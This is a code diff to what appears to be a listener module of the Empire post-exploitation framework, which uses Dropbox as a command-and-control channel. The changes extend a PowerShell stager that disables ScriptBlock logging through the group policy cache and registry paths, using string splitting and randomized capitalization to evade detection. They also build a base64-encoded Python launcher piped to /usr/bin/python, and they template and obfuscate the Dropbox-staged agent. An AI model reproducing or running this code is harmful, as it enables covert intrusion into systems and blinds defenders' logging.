@@ -14,6 +14,8 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import templating
+from lib.common import obfuscation
 
 
 class Listener:
@@ -189,16 +191,23 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += helpers.randomize_capitalization("){$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += helpers.randomize_capitalization("$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
@@ -356,7 +365,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -422,18 +431,20 @@ class Listener:
 
 
         elif language.lower() == 'python':
+            template_path = os.path.join(self.mainMenu.installPath, '/data/agent/stagers')
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template('dropbox.py')
 
-            f = open("%s/data/agent/stagers/dropbox.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            template_options = {
+                    'staging_folder': stagingFolder,
+                    'poll_interval': pollInterval,
+                    'staging_key': stagingKey,
+                    'profile': profile,
+                    'api_token': apiToken
+                    }
 
-            stager = helpers.strip_python_comments(stager)
-            # patch the server and key information
-            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
-            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
-            stager = stager.replace('REPLACE_PROFILE', profile)
-            stager = stager.replace('REPLACE_API_TOKEN', apiToken)
+            stager = template.render(template_options)
+            stager = obfuscation.py_minify(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -468,7 +479,7 @@ class Listener:
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             code = f.read()
             f.close()
 
@@ -492,7 +503,7 @@ class Listener:
 
             return code
         elif language == 'python':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
 
